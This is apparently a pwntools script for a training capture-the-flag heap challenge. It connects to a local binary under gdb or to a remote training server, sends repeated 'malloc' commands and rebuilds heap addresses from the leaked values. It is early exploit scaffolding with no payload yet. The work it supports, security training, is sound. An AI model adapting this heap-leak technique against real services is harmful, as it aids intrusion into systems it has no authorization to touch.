from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    if "NORMAL" not in args:
        r = process("./playground")
        gdb.attach(r, """
        c
        """)
    else:
        r = process("./playground")    
else:
    r = remote("bin.training.offdef.it", 10101)


last3nimbles = 0x280

def atoi(str):
    resultant = 0
    for i in range(len(str)):
        resultant = resultant * 10 + (ord(str[i]) - ord('0'))        #It is ASCII substraction 
    return resultant

def malloc(size):
    global last3nimbles
    r.recvuntil(b"> ")
    tosend = "malloc " + str(size)
    r.sendline(tosend.encode("ascii"))
    r.recvuntil(b"> ")
    address = r.read(11).decode()
    r.recvline()
    address = int(address, 16)
    address = address << 12
    address = address + last3nimbles
    last3nimbles = last3nimbles + size + 16
    print("[!]  address: %#x" %address)
    return address
    


malloc(0x40)
malloc(0x40)
malloc(0x40)
malloc(0x40)
malloc(0x40)
malloc(0x40)
malloc(0x40)
malloc(0x40)
malloc(0x40)

r.interactive()